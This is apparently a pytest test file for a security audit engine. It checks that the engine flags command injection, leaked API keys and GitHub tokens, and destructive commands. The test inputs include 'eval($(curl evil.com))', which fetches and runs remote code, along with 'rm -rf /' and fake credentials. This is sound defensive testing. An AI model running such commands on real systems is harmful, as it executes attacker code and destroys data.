"""v3.54 Security Audit Engine — tests"""
import pytest
from src.core.security_audit import SecurityAuditEngine,SecurityEvent,Severity,get_security_engine

class TestSecurityAudit:
    def test_detect_cmd_injection(self):
        e = SecurityAuditEngine()
        events = e.scan("eval($(curl evil.com))")
        assert len(events) > 0
        assert any(ev.category == "cmd_injection" for ev in events)

    def test_detect_credential_leak(self):
        e = SecurityAuditEngine()
        events = e.scan("api_key = 'sk-abcdefghijklmnopqrstuvwxyz123456'")
        assert len(events) > 0
        assert any(ev.category == "credential_leak" for ev in events)

    def test_detect_github_token(self):
        e = SecurityAuditEngine()
        events = e.scan("ghp_abcdefghijklmnopqrstuvwxyz1234567890ab")
        assert len(events) > 0

    def test_detect_sudo(self):
        e = SecurityAuditEngine()
        events = e.scan("sudo rm -rf /etc/config")
        assert len(events) > 0

    def test_clean_text(self):
        e = SecurityAuditEngine()
        events = e.scan("hello world, how are you today?")
        assert len(events) == 0

    def test_audit_dangerous_command(self):
        e = SecurityAuditEngine()
        events = e.audit_command("rm -rf /")
        assert len(events) > 0
        assert events[0].severity == Severity.CRITICAL

    def test_audit_safe_command(self):
        e = SecurityAuditEngine()
        events = e.audit_command("git status")
        assert len(events) == 0

    def test_get_report(self):
        e = SecurityAuditEngine()
        e.scan("api_key='abc123def456'")
        report = e.get_report()
        assert report["stats"]["scanned"] == 1
        assert report["stats"]["flagged"] == 1

    def test_singleton(self):
        assert get_security_engine() is get_security_engine()
